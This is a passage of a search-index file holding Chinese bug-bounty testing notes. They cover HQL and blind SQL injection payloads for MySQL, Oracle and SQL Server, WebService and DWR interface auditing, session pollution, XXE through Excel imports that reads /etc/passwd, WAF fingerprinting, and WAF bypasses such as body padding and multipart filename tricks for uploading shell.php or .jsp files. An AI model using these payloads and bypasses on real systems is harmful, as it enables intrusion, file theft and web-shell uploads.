\u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528 \u00b6 WEBSERVICE\u63a5\u53e3 \u00b6 1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 \u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165 DWR\u63a5\u53e3 \u00b6 \u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c \u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765 HESSIAN\u63a5\u53e3 \u00b6 GWT\u63a5\u53e3 \u00b6 \u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC \u00b6 SESSION\u6c61\u67d3 \u00b6 \u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898 XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f \u00b6 \u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a \u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"\u4f17\u6d4b\u9879\u76ee"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_1","text":"\u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49","title":"\u524d\u8a00"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_2","text":"\u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 \u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9","title":"\u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#1","text":"\u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 ,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5","title":"1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#2waf","text":"","title":"2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf","text":"WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002","title":"waf\u7684\u539f\u7406"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf_1","text":"WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b","title":"WAF\u5173\u952e\u6280\u672f"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf_2","text":"","title":"waf\u7684\u8bc6\u522b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#cookie","text":"Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c","title":"\u57fa\u4e8eCookie\u503c"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#http","text":"Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d","title":"\u57fa\u4e8eHTTP\u54cd\u5e94"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_3","text":"\u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch","title":"\u7279\u5b9a\u8d44\u6e90\u6587\u4ef6"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf_3","text":"","title":"\u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#1-waf","text":"","title":"1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#11","text":"\u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6","title":"1.1\u5bfb\u627e\u6e90\u7ad9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#12","text":"\u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7","title":"1.2\u5229\u7528\u540c\u7f51\u6bb5"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#13","text":"\u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF","title":"1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#2-waf","text":"WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b","title":"2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#3-waf","text":"","title":"3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#31","text":"Waf\u672a\u80fd\u8986\u76d6Content-Type: multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7","title":"3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#32","text":"\u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php","title":"3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#33web","text":"\u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 